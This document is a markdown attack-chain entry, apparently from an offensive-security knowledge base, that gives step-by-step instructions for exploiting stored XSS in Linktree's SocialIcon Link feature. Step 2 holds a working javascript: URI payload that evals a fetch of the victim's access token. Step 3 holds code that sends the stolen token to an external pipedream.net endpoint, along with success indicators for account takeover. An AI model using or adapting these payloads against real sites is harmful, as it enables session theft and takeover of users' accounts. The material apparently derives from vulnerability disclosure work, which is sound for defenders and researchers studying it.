---
tags:
  - xss
  - stored-xss
  - javascript-uri
  - token-theft
  - information-disclosure
type: attack_chain
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2024-10-01T00:00:00Z'
procedures:
  - '[[procedures/Identify-Lack-of-URL-Validation-in-SocialIcon-Link]]'
  - '[[procedures/Craft-Malicious-JavaScript-URI-Payload]]'
  - '[[procedures/Exploit-XSS-to-Fetch-and-Exfiltrate-Access-Token]]'
  - '[[procedures/Demonstrate-POC-via-Video]]'
step_count: 4
techniques:
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
updated_at: '2025-12-13T23:55:38.307Z'
description: >-
  A multi-stage attack exploiting lack of URL validation in Linktree's
  SocialIcon Link feature to inject a JavaScript URI, trigger stored XSS, and
  steal authentication access tokens via an internal API endpoint.
skill_level: intermediate
impact_level: high
id: 13b3fa3e-5248-4ed0-98dd-92d1287e48b7
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
---
# Stored XSS in Linktree SocialIcon Link Leading to Access Token Theft

Multi-stage attack chain demonstrating a complete attack workflow exploiting stored XSS in Linktree's SocialIcon Link feature to steal access tokens.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Identify URL Validation Flaw] --> B[Craft JS URI Payload]
    B --> C[Trigger Stored XSS and Fetch Token]
    C --> D[Exfiltrate Token and Demonstrate POC]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Browser developer tools for testing
- External server (e.g., pipedream.net) for exfiltration

### Target Environment

- Linktree web platform
- Access to account creation or editing features
- No specific ports; web-based over HTTPS

### Initial Access Requirements

- Valid Linktree account for injecting the payload
- Network access to linktr.ee
- No prior credentials beyond basic user access

## Detailed Attack Procedures

### Step 1: Identify Lack of URL Validation
procedure: [[procedures/Identify-Lack-of-URL-Validation-in-SocialIcon-Link]]

**Objective**: Test and confirm the absence of URL scheme validation in the SocialIcon Link input field.

**Instructions**: Navigate to the SocialIcon Link input in Linktree's profile editor and test various URL schemes, including 'javascript:', to verify if they are accepted without sanitization.

**Expected Output**: The input accepts arbitrary schemes like 'javascript:' without rejection or escaping.

**Success Indicators**:
- Input field allows 'javascript:' prefixed URLs
- No client-side or server-side validation errors

### Step 2: Craft Malicious JavaScript URI Payload
procedure: [[procedures/Craft-Malicious-JavaScript-URI-Payload]]

**Objective**: Create a JavaScript URI that executes code to fetch and display or exfiltrate the access token upon rendering.

**Instructions**: Construct the payload using a 'javascript:' scheme with eval to run an async fetch to the internal API. Use [[commands/javascript-uri-xss-payload]] for the base structure:

```javascript
javascript://https://amazon.com/shop/x%0Aeval("(async()=>{await+fetch('https://linktr.ee/api/token').then((response)=>response.json()).then((responseJson)=>{alert(responseJson['accessToken']);})})()")
```

Adapt for exfiltration if needed.

**Expected Output**: A valid URI that, when injected, triggers JS execution.

**Success Indicators**:
- Payload parses without syntax errors
- Test in a safe environment shows alert or fetch

### Step 3: Exploit XSS to Fetch and Exfiltrate Access Token
procedure: [[procedures/Exploit-XSS-to-Fetch-and-Exfiltrate-Access-Token]]

**Objective**: Inject the payload into SocialIcon Link, trigger stored XSS when rendered, and use it to steal the access token via API call.

**Instructions**: Submit the crafted payload as the SocialIcon Link URL. When a victim views the profile, the link renders and executes the JS. Use [[commands/fetch-access-token-exfil]] within the payload:

```javascript
await fetch("https://linktr.ee/api/token",{"credentials":"include","method":"GET"}).then((response)=> response.json()).then((responseJson)=>{fetch("https://en2celr7rewbul.m.pipedream.net/?token="+responseJson["accessToken"]);})
```

Monitor the external server for the exfiltrated token.

**Expected Output**: Access token sent to the attacker's server.

**Success Indicators**:
- API responds with JSON containing accessToken
- Token appears on exfiltration endpoint
- Potential account takeover possible with the token

### Step 4: Demonstrate POC via Video
procedure: [[procedures/Demonstrate-POC-via-Video]]

**Objective**: Record the full exploitation to validate and showcase the attack.

**Instructions**: Set up a test Linktree account, inject the payload, and record screen showing injection, rendering, and token alert or exfiltration.

**Expected Output**: Video file demonstrating the XSS trigger and token theft.

**Success Indicators**:
- Video captures alert popup with token
- Exfiltration confirmed in logs

## Attack Chain Summary

### Key Achievements

1. Confirmed stored XSS via unvalidated JavaScript URIs in SocialIcon Links
2. Exploited internal API to leak access tokens despite HttpOnly cookies
3. Demonstrated potential for account takeover through token theft

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]
- [[Steal Web Session Cookie]]

### MITRE ATT&CK Tactics

- [[Execution]]
- [[Collection]]

---
*Last updated: 2024-10-01T00:00:00Z*
